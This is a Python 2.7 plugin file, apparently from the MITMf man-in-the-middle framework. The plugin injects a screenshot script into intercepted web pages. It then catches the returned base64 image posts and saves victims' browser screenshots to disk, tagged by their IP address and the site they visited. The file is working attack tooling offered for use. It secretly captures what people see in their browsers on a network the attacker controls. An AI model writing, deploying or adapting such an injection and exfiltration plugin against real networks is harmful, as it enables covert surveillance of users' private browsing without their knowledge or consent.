#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import logging
import base64

from datetime import datetime
from plugins.Inject import Inject
from plugins.plugin import Plugin

mitmf_logger = logging.getLogger('mitmf')

class ScreenShotter(Inject, Plugin):
	name     = 'ScreenShotter'
	optname  = 'screen'
	desc     = 'Uses HTML5 Canvas to render an accurate screenshot of a clients browser'
	ver      = '0.1'
	has_opts = False

	def initialize(self, options):
		Inject.initialize(self, options)
		self.html_payload = self.get_payload()

	def clientRequest(self, request):
		if 'saveshot' in request.uri:
			request.printPostData = False
			img_file = './logs/{}-{}-{}.png'.format(request.client.getClientIP(), request.headers['host'], datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
			with open(img_file, 'wb') as img:
				img.write(base64.b64decode(request.postData[30:] + '=='))
				img.close()

			mitmf_logger.info('{} [ScreenShotter] Saved screenshot to {}'.format(request.client.getClientIP(), img_file))

	def get_payload(self):
		canvas = open("./core/javascript/screenshot.js", "rb").read()
		return '<script type="text/javascript">' + canvas + '</script>'